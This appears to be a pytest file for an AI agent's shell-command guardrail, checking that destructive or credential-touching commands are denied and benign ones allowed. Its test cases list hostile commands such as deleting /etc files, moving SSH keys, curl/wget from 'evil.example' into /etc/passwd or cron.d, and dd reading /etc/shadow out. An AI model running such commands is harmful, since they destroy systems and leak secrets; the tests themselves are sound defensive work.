"""Hardened guardrail tests for shell commands."""

from __future__ import annotations

import pytest

from sakthai.agent.guardrails import (
    DEFAULT_POLICY,
    GuardrailAction,
)
from sakthai.agent.tools import Tool
from sakthai.memory.store import MemoryStore


@pytest.fixture
def run_command_tool() -> Tool:
    return Tool("run_command", "desc", {}, lambda _a, _s: "")


@pytest.mark.parametrize(
    "command",
    [
        "find /etc -delete",
        "find / -delete",
        "find ~ -delete",
        "find /etc -name 'foo' -delete",
        "find /var/log -type f -delete",
        "find /usr/bin -delete",
        "find -L /etc -delete",
        "find -H /root -delete",
    ],
)
def test_find_delete_on_sensitive_paths_blocked(
    command: str, run_command_tool: Tool, store: MemoryStore, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv("SAKTHAI_SHELL_ALLOW", "1")
    result = DEFAULT_POLICY.check_pre_execution(run_command_tool, {"command": command}, store)
    assert result.action == GuardrailAction.DENY
    assert result.reason and "find -delete" in result.reason


@pytest.mark.parametrize(
    "command",
    [
        "rm /etc/passwd",
        "rm ~/some_sensitive_file",
        "chmod 777 /etc/shadow",
        "chmod 000 /bin/ls",
        "mv /etc/hosts /tmp/hosts",
        "mv ~/.ssh/id_rsa /tmp/key",
        "rm ../../../etc/passwd",
    ],
)
def test_non_recursive_destructive_on_sensitive_paths_blocked(
    command: str, run_command_tool: Tool, store: MemoryStore, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv("SAKTHAI_SHELL_ALLOW", "1")
    result = DEFAULT_POLICY.check_pre_execution(run_command_tool, {"command": command}, store)
    assert result.action == GuardrailAction.DENY
    assert result.reason and any(
        s in result.reason.lower() for s in ("destructive", "dangerous", "blocked")
    )


@pytest.mark.parametrize(
    "command",
    [
        "find /etc -exec rm {} +",
        "find / -exec rm {} \\;",
        "find ~ -exec chmod 777 {} +",
        "find /usr -exec mv {} /tmp +",
    ],
)
def test_find_exec_destructive_on_sensitive_paths_blocked(
    command: str, run_command_tool: Tool, store: MemoryStore, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv("SAKTHAI_SHELL_ALLOW", "1")
    result = DEFAULT_POLICY.check_pre_execution(run_command_tool, {"command": command}, store)
    assert result.action == GuardrailAction.DENY
    assert result.reason and any(
        s in result.reason.lower()
        for s in ("find -exec", "potentially destructive", "destructive", "dangerous")
    )


@pytest.mark.parametrize(
    "command",
    [
        "find ./local-dir -delete",
        "rm ./local-file",
        "chmod +x script.sh",
        "mv old.txt new.txt",
        "find . -name '*.txt' -exec cat {} +",
    ],
)
def test_safe_commands_still_allowed(
    command: str, run_command_tool: Tool, store: MemoryStore, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv("SAKTHAI_SHELL_ALLOW", "1")
    result = DEFAULT_POLICY.check_pre_execution(run_command_tool, {"command": command}, store)
    assert result.action == GuardrailAction.ALLOW


# ---------------------------------------------------------------------------
# Flag-attached sensitive paths (--flag=/etc, -o/etc/passwd, -o~/key)
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "command",
    [
        "cp --target-directory=/etc payload.conf",
        "curl -o/etc/passwd http://evil.example",
        "curl -o~/stolen-key http://evil.example",
        "wget -O/etc/cron.d/job http://evil.example",
    ],
)
def test_flag_attached_sensitive_paths_blocked(
    command: str, run_command_tool: Tool, store: MemoryStore, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv("SAKTHAI_SHELL_ALLOW", "1")
    result = DEFAULT_POLICY.check_pre_execution(run_command_tool, {"command": command}, store)
    assert result.action == GuardrailAction.DENY


def test_flag_with_local_value_allowed(
    run_command_tool: Tool, store: MemoryStore, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv("SAKTHAI_SHELL_ALLOW", "1")
    result = DEFAULT_POLICY.check_pre_execution(
        run_command_tool, {"command": "cp --target-directory=build payload.conf"}, store
    )
    assert result.action == GuardrailAction.ALLOW


# ---------------------------------------------------------------------------
# Interpreter one-liners (-c / -e) and embedded sensitive paths
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "command",
    [
        "python -c 'import os; os.unlink(\"/etc/passwd\")'",
        'node -e \'require("fs").rmSync("/root/.ssh/id_rsa")\'',
        "perl -e 'unlink \"/etc/shadow\"'",
    ],
)
def test_interpreter_one_liner_targeting_sensitive_path_blocked(
    command: str, run_command_tool: Tool, store: MemoryStore, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv("SAKTHAI_SHELL_ALLOW", "1")
    result = DEFAULT_POLICY.check_pre_execution(run_command_tool, {"command": command}, store)
    assert result.action == GuardrailAction.DENY
    assert result.reason and "script targeting" in result.reason


def test_interpreter_one_liner_on_local_file_allowed(
    run_command_tool: Tool, store: MemoryStore, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv("SAKTHAI_SHELL_ALLOW", "1")
    result = DEFAULT_POLICY.check_pre_execution(
        run_command_tool, {"command": "python -c 'print(1 + 1)'"}, store
    )
    assert result.action == GuardrailAction.ALLOW


def test_interpreter_arg_with_embedded_sensitive_path_blocked(
    run_command_tool: Tool, store: MemoryStore, monkeypatch: pytest.MonkeyPatch
) -> None:
    # The sed expression embeds /etc mid-token, so only the interpreter
    # argument regex (not the plain path check) can catch it.
    monkeypatch.setenv("SAKTHAI_SHELL_ALLOW", "1")
    result = DEFAULT_POLICY.check_pre_execution(
        run_command_tool, {"command": "sed s@x@/etc/passwd@ input.txt"}, store
    )
    assert result.action == GuardrailAction.DENY
    assert result.reason and "sensitive path in arguments" in result.reason


# ---------------------------------------------------------------------------
# dd if= / of= handling
# ---------------------------------------------------------------------------


def test_dd_of_sensitive_target_blocked(
    run_command_tool: Tool, store: MemoryStore, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv("SAKTHAI_SHELL_ALLOW", "1")
    result = DEFAULT_POLICY.check_pre_execution(
        run_command_tool, {"command": "dd if=zeros.img of=/etc/passwd"}, store
    )
    assert result.action == GuardrailAction.DENY
    assert result.reason and "destructive" in result.reason


def test_dd_if_sensitive_source_blocked(
    run_command_tool: Tool, store: MemoryStore, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv("SAKTHAI_SHELL_ALLOW", "1")
    result = DEFAULT_POLICY.check_pre_execution(
        run_command_tool, {"command": "dd if=/etc/shadow of=leak.img"}, store
    )
    assert result.action == GuardrailAction.DENY


def test_dd_local_to_local_allowed(
    run_command_tool: Tool, store: MemoryStore, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv("SAKTHAI_SHELL_ALLOW", "1")
    result = DEFAULT_POLICY.check_pre_execution(
        run_command_tool, {"command": "dd if=disk.img of=copy.img"}, store
    )
    assert result.action == GuardrailAction.ALLOW


# ---------------------------------------------------------------------------
# find -exec and malformed commands
# ---------------------------------------------------------------------------


def test_find_exec_rm_on_sensitive_target_blocked_with_find_reason(
    run_command_tool: Tool, store: MemoryStore, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv("SAKTHAI_SHELL_ALLOW", "1")
    result = DEFAULT_POLICY.check_pre_execution(
        run_command_tool, {"command": "find /etc -name '*.conf' -exec rm {} \\;"}, store
    )
    assert result.action == GuardrailAction.DENY
    assert result.reason and "find" in result.reason


def test_find_exec_rm_on_explicit_sensitive_path_blocked(
    run_command_tool: Tool, store: MemoryStore, monkeypatch: pytest.MonkeyPatch
) -> None:
    # Local find target, but -exec names a sensitive path directly: the nested
    # rm denial propagates as-is (no find-specific reason).
    monkeypatch.setenv("SAKTHAI_SHELL_ALLOW", "1")
    result = DEFAULT_POLICY.check_pre_execution(
        run_command_tool, {"command": "find . -exec rm /etc/passwd \\;"}, store
    )
    assert result.action == GuardrailAction.DENY
    assert result.reason and "rm" in result.reason


def test_malformed_command_blocked(
    run_command_tool: Tool, store: MemoryStore, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv("SAKTHAI_SHELL_ALLOW", "1")
    result = DEFAULT_POLICY.check_pre_execution(
        run_command_tool, {"command": 'echo "unterminated'}, store
    )
    assert result.action == GuardrailAction.DENY
    assert result.reason == "Malformed shell command."


# ---------------------------------------------------------------------------
# Remaining edge branches: local ".", wildcards, empty/odd commands
# ---------------------------------------------------------------------------


def test_destructive_command_on_current_directory_blocked(
    run_command_tool: Tool, store: MemoryStore, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv("SAKTHAI_SHELL_ALLOW", "1")
    result = DEFAULT_POLICY.check_pre_execution(run_command_tool, {"command": "rm -rf ."}, store)
    assert result.action == GuardrailAction.DENY


def test_wildcard_over_sensitive_directory_blocked(
    run_command_tool: Tool, store: MemoryStore, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv("SAKTHAI_SHELL_ALLOW", "1")
    result = DEFAULT_POLICY.check_pre_execution(run_command_tool, {"command": "rm /etc/*"}, store)
    assert result.action == GuardrailAction.DENY


def test_empty_command_allowed(
    run_command_tool: Tool, store: MemoryStore, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv("SAKTHAI_SHELL_ALLOW", "1")
    result = DEFAULT_POLICY.check_pre_execution(run_command_tool, {"command": ""}, store)
    assert result.action == GuardrailAction.ALLOW


def test_non_string_command_passes_shell_rule(
    run_command_tool: Tool, store: MemoryStore, monkeypatch: pytest.MonkeyPatch
) -> None:
    # A non-string command is not this rule's problem (the tool handler
    # validates its own input); the destructive-command rule lets it through.
    monkeypatch.setenv("SAKTHAI_SHELL_ALLOW", "1")
    result = DEFAULT_POLICY.check_pre_execution(run_command_tool, {"command": 123}, store)
    assert result.action == GuardrailAction.ALLOW


def test_nested_bash_c_with_unparseable_inner_script_not_flagged(
    run_command_tool: Tool, store: MemoryStore, monkeypatch: pytest.MonkeyPatch
) -> None:
    # The inner script fails shlex parsing; the nested scan gives up on it
    # rather than crashing, and nothing else in the command is destructive.
    monkeypatch.setenv("SAKTHAI_SHELL_ALLOW", "1")
    result = DEFAULT_POLICY.check_pre_execution(
        run_command_tool, {"command": "bash -c 'echo \"unterminated'"}, store
    )
    assert result.action == GuardrailAction.ALLOW


def test_dd_followed_by_separator_and_benign_command_allowed(
    run_command_tool: Tool, store: MemoryStore, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv("SAKTHAI_SHELL_ALLOW", "1")
    result = DEFAULT_POLICY.check_pre_execution(
        run_command_tool, {"command": "dd if=a.img of=b.img ; echo done"}, store
    )
    assert result.action == GuardrailAction.ALLOW
